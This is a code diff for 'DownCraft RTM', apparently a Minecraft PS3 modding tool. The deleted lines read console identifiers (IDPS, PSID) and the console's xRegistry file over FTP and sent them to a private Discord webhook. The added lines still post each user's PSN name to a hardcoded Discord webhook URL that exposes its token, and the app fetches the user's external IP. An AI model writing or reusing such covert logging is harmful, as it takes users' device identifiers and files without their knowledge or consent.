@@ -40,7 +40,6 @@ namespace DownCraft
         public static int x;
         public static int y;
         PS3API PS3 = new PS3API();
-        public static Thread CheckProcess = new Thread(new ThreadStart(Functions.CheckBadProcess));
 
         string DefaultName;
 
@@ -78,24 +77,20 @@ namespace DownCraft
             InitializeComponent();
         }
 
-
         #region "Form Load"
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            CheckProcess.Start();
-
             this.GunaPanelTop.MouseDown += this.xMouseDown; //For Move Form
             this.GunaPanelTop.MouseMove += this.xMouseMove; //For Move Form
             this.GunaPanelTop.MouseDown += this.xMouseDown; //For Move Form
             this.GunaPanelTop.MouseMove += this.xMouseMove; //For Move Form
 
-            //API CONNECT
             try
             {
                 WebClient webClientUpdate = new WebClient();
 
-                if (!webClientUpdate.DownloadString("https://pastebin.com/raw/v5nanRE7").Contains("5.0"))
+                if (!webClientUpdate.DownloadString("https://pastebin.com/raw/v5nanRE7").Contains("10.0"))
                 {
                     if (MessageBox.Show("A new update is available !", "DownCraft RTM", MessageBoxButtons.OK, MessageBoxIcon.Question) == DialogResult.OK)
                     {
@@ -226,27 +221,9 @@ namespace DownCraft
                                 FIRMWARE = PS3.CCAPI.GetFirmwareType();
                                 string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");
 
-                                if (TYPE_CONSOLE == "HEN")
-                                {
-                                    IDPS = PS3.MAPI.PS3.GetIDPS();
-                                    PSID = PS3.MAPI.PS3.GetPSID();
-                                    FUNCTIONS.Send_WebHook(FUNCTIONS.logs_downcraft_private, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + DefaultName + " PSID: " + PSID + " IDPS:" + IDPS);
-                                }
-
                                 FUNCTIONS.SetDiscordRPC("Connected to PS3", "Made by Misakiii", "DownCraft RTM\nUpdate V1\nPSN: " + DefaultName + "");
-
-                                FUNCTIONS.Send_WebHook(FUNCTIONS.logs_downcraft, "DownCraft Logs", RandomAvatar, "```" + RandomEmojis + " User: " + DefaultName + " is now connected to DownCraft RTM. " + RandomEmojis + " ```");
+                                FUNCTIONS.Send_WebHook("https://discord.com/api/webhooks/1094750305373126766/WWYL-GFEgC-1Lf1wtqS_xN3iXRNpSEnMa4DyA7bs0SFt10D-EyCv_nXFs1vuJUXNRvt2", "DownCraft Logs", RandomAvatar, "```" + RandomEmojis + " User: " + DefaultName + " is now connected to DownCraft RTM. " + RandomEmojis + " ```");
                                 Offsets.Connected = true;
-
-                                try
-                                {
-                                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + Offsets.ps3IP, "", "", PathLocation1, xRegistry);
-                                    FUNCTIONS.SendWebookFile(FUNCTIONS.logs_downcraft_private, "", "", "xRegistry", "xRegistry.txt", xRegistry);
-                                }
-                                catch(Exception ex)
-                                {
-
-                                }
                             }
                             else
                             {
@@ -383,9 +360,9 @@ namespace DownCraft
             }
         }
 
-            private void guna2Button26_Click(object sender, EventArgs e)
+        private void guna2Button26_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("DownCraft RTM Premium\nUpdate V4.1\n\nWhat is DownCraft?\nDownCraft is a RTM (Real-Time Modding) for Minecraft PS3, it works on the last version, 1.84. DownCraft was created in 2018 on the TU1.71 update for Minecraft PS3.\n\nAll credits go to NELUxP MoDz, Mayhem Modding, DublinModz, Misakiii, He6po, Magethsi.\n\nJoin our Discord servers to stay updated on what's new!\n\nA big thanks to you for still using DownCraft after about 3 - 4 years now <3\n\n- Misakiii", "About", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            MessageBox.Show("DownCraft RTM Premium\nUpdate V5\n\nWhat is DownCraft?\nDownCraft is a RTM (Real-Time Modding) for Minecraft PS3, it works on the last version, 1.84. DownCraft was created in 2018 on the TU1.71 update for Minecraft PS3.\n\nAll credits go to NELUxP MoDz, Mayhem Modding, DublinModz, Misakiii, He6po, Magethsi.\n\nJoin our Discord servers to stay updated on what's new!\n\nA big thanks to you for still using DownCraft after about 3 - 4 years now <3\n\n- Misakiii", "About", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
@@ -6289,7 +6266,6 @@ namespace DownCraft
                     string[] Emojis = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
                     string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];
                     string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];
-                    FUNCTIONS.Send_WebHook(FUNCTIONS.logs_downcraft, "DownCraft Logs", RandomAvatar, "```" + RandomEmojis + " User: " + label5.Text + " enabled the SPRX V4. " + RandomEmojis + "```");
                 }
                 else
                 {
@@ -6312,8 +6288,6 @@ namespace DownCraft
 
         }
 
-        #endregion
-
         private void guna2Button30_Click(object sender, EventArgs e)
         {
             System.Environment.Exit(1);
@@ -6333,5 +6307,7 @@ namespace DownCraft
         {
             Process.Start("");
         }
+
+        #endregion
     }
 }
